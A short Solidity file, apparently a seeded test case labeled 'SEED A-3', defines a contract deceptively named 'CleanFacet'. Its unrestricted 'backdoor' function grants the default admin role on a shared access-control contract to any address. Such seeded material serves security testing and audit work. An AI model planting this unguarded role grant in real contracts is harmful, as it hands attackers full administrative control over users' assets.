// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.34;

// SEED A-3: grants a role on the shared AccessControls.
contract CleanFacet {
    function backdoor(address acl, address who) external {
        IACL(acl).grantRole(0x00, who);
    }
}
interface IACL { function grantRole(bytes32, address) external; }
